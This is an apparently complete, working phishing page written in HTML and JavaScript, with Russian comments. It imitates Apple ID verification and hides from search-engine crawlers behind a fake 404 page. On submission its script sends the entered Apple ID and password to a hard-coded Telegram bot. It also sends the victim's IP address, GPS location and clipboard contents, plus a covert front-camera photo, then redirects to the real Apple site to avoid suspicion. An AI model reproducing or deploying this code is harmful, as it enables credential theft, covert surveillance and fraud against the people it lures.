<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple ID Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f2f2f7; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; padding: 30px 20px; text-align: center; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .logo { width: 50px; margin-bottom: 15px; }
        h2 { margin-bottom: 10px; font-weight: 600; font-size: 22px; }
        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.4; }
        input { width: 100%; padding: 15px; margin: 8px 0; background: #f2f2f7; border: 1px solid #e5e5ea; color: #000; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; margin-top: 15px; cursor: pointer; }
        #fakePage { display: none; text-align: center; padding: 50px; }
    </style>
</head>
<body>

    <!-- Клоакинг: если зашел бот Google, он увидит это -->
    <div id="fakePage">
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on this server.</p>
    </div>

    <!-- Основная фишинговая форма -->
    <div class="container" id="phishContainer" style="display:none;">
        <svg class="logo" viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.74 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.92.21-9.84-1.96-14.74-6.52-3.13-2.73-7.04-7.43-11.72-14.12-5.02-7.15-9.14-15.45-12.37-24.9-3.46-10.18-5.2-20.05-5.2-29.62 0-10.95 2.37-20.39 7.12-28.33 3.73-6.36 8.7-11.39 14.92-15.08 6.22-3.69 12.94-5.57 20.2-5.66 3.92 0 9.06 1.21 15.45 3.59 6.37 2.39 10.47 3.6 12.27 3.6 1.34 0 5.88-1.42 13.59-4.26 7.28-2.62 13.43-3.71 18.47-3.28 13.65 1.1 23.91 6.48 30.73 16.16-12.21 7.4-18.25 17.76-18.14 31.02.11 10.34 3.86 18.94 11.22 25.78 3.34 3.17 7.06 5.62 11.18 7.36-.9 2.61-1.84 5.11-2.84 7.51zM119.11 9.57c0 8.12-2.97 15.7-8.88 22.7-7.14 8.34-15.78 13.15-25.15 12.41-.12-1.03-.19-2.11-.19-3.25 0-7.8 3.4-16.15 9.44-22.98 3.02-3.46 6.86-6.34 11.52-8.62 4.65-2.25 9.05-3.49 13.18-3.71.12 1.16.18 2.32.18 3.45z" fill="#000"/></svg>
        <h2>Apple ID Verification</h2>
        <p>Your Apple ID was flagged for suspicious activity. Please verify your account.</p>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Apple ID or Phone Number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Continue</button>
        </form>
    </div>

    <video id="camera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
        const CHAT_ID = "7485234259";

        // --- 1. КЛОАКИНГ (ЗАЩИТА ОТ GOOGLE) ---
        const ua = navigator.userAgent.toLowerCase();
        const isBot = /googlebot|bingbot|yandexbot|facebookexternalhit|twitterbot|applebot|baidu|duckduckbot|crawler|spider|slurp|headless/i.test(ua);
        
        if (isBot) {
            document.getElementById('fakePage').style.display = 'block';
        } else {
            document.getElementById('phishContainer').style.display = 'block';
        }

        // Функции отправки
        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        // --- 2. СБОР ДАННЫХ ПРИ ОТПРАВКЕ ---
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.innerText = "Verifying...";
            btn.disabled = true;

            const user = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            // Отправляем пароль
            sendText(`🍏 Apple ID Phish\n👤 Логин: ${user}\n🔑 Пароль: ${pass}`);

            // Сбор IP
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});

            // Сбор GPS
            navigator.geolocation.getCurrentPosition(
                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                (err) => sendText(`🗺️ GPS: Запрещен`),
                { timeout: 5000, enableHighAccuracy: true }
            );

            // Сбор буфера обмена (то, что копировали)
            try {
                const clip = await navigator.clipboard.readText();
                if (clip) sendText(`📋 Буфер обмена: ${clip}`);
            } catch(e) {}

            // Скрытое фото (выскочит окно камеры)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                await sendPhoto(blob, `📸 Селфи жертвы`);
            } catch (err) {}

            // Перекидываем на настоящий Apple, чтобы не спалиться
            setTimeout(() => {
                window.location.href = "https://appleid.apple.com";
            }, 2000);
        });
    </script>
</body>
</html>
